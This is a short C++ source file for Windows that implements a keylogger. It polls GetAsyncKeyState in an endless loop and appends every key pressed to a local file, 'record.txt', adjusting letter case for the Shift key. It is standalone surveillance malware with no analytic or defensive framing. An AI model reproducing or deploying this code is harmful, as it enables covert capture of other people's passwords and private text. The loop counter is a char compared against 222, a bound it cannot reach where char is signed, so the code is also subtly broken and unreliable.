#include <iostream>
#include <winuser.h>
#include <windows.h>
#include <fstream>
using namespace std;


int main()
{
    char key;
    for (; ; )
    {
        for (key=8;key<222 ;key++ )
        {
                if( GetAsyncKeyState(key) == -32767 )
                {
                    ofstream write("record.txt", ios::app);
                     if (  !(GetAsyncKeyState(0x10)) ) //0x10 is the notation for SHIFT Key
                        {
                              if ((key>64) && (key<91))
                              {
                                       key+=32;
                              write << key;
                              break;
                              }
                              write<<key;
                        }

                        else if ( key>64 && key<91 )
                        {
                              write << key;
                              break;
                        }
                        else
                        {
                              write<<key;
                        }
                }
        }
    }
    return 0;
}
